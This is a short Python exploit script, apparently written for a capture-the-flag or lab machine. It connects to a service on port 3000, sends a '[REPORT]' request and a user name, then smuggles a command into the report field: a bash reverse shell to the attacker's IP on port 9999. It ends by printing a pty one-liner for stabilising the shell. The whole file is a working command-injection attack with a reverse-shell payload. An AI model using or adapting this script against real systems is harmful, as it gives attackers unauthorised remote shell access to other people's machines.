import socket

IP="10.10.155.192" #Change IP
PORT=3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
recv = s.recv(1024).decode()
message = "[REPORT]\n\r"
data = message.encode()
s.send(data)
recv = s.recv(1024).decode()
name = "harry\n\r"
s.send(name.encode())
r = s.recv(1024).decode()
report_text = "; bash -i >& /dev/tcp/<<IPADDRESS>>/9999 0>&1 #\n\r" 
s.send(report_text.encode())
print("Dont close until you have a stable shell\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
s.recv(1024).decode()
